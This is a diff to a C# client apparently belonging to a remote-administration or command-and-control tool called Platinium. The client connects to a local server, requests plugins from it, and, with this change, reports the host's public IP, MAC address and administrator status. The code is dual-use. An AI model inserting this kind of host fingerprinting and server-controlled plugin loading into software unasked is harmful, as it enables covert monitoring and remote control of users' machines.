@@ -1,4 +1,5 @@
-﻿using Platinium.Shared.Content;
+﻿using Platinium.Core;
+using Platinium.Shared.Content;
 using Platinium.Shared.Core;
 using Platinium.Shared.Data.Packages;
 using Platinium.Shared.Data.Serialization;
@@ -7,7 +8,9 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Net.Sockets;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -18,14 +21,14 @@ namespace Platinium
     {
         class PlatiniumClient
         {
-            private BaseInfo ClientInfo = BuildClientInfo();
+            private ClientInfo ClientInfo = BuildClientInfo();
             private TcpClient clientSocket = new TcpClient();
             private NetworkStream serverStream = default(NetworkStream);
             public PlatiniumClient()
             {
                 clientSocket.Connect(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 55555));
                 serverStream = clientSocket.GetStream();
-                Write(new Package(null, ClientInfo, PackageType.Base, new BaseInfo(BaseInfoType.Server), ClientInfo));
+                Write(new Package(null, ClientInfo, PackageType.Base, new ClientInfo(BaseInfoType.Server), ClientInfo));
                 Thread GetThread = new Thread(Get);
                 GetThread.Start();
                 LoadPlugins();
@@ -33,7 +36,7 @@ namespace Platinium
             private void LoadPlugins()
             {
                 Console.WriteLine("DOWNLOADING PLUGINS");
-                Write(new Package("LOAD_PLUGINS", null, PackageType.Plugin, new BaseInfo(BaseInfoType.Server), ClientInfo));
+                Write(new Package("LOAD_PLUGINS", null, PackageType.Plugin, new ClientInfo(BaseInfoType.Server), ClientInfo));
             }
             private void Write(Package package)
             {
@@ -58,17 +61,42 @@ namespace Platinium
                     Console.WriteLine("GET");
                 }
             }
-            private static BaseInfo BuildClientInfo()
+            private static ClientInfo BuildClientInfo()
             {
-                BaseInfo ci = new BaseInfo
+                ClientInfo ci = new ClientInfo
                 {
-                    IP = "127.0.0.1",
-                    MACAddress = "MAC",
-                    Name = "TESTClient",
+                    IP = CFunctions.GetPublicIP(),
+                    MACAddress = CFunctions.GetMacAddress(),
+                    UserName = "TESTClient",
                     UID = "2",
-                    Type = BaseInfoType.Client
+                    Type = BaseInfoType.Client,
+                    IsAdministrator = CFunctions.IsAdministrator(),
+
+
                 };
                 return ci;
+            }
+        }
+    }
+    namespace Core
+    {
+        public class CFunctions
+        {
+            public static bool IsAdministrator()
+            {
+                WindowsIdentity identity = WindowsIdentity.GetCurrent();
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
+            public static string GetPublicIP()
+            {
+                return new WebClient().DownloadString(@"http://icanhazip.com").Trim();
+            }
+            public static string GetMacAddress()
+            {
+                return (from nic in NetworkInterface.GetAllNetworkInterfaces()
+                        where nic.OperationalStatus == OperationalStatus.Up
+                        select nic.GetPhysicalAddress().ToString()).FirstOrDefault();
             }
         }
     }
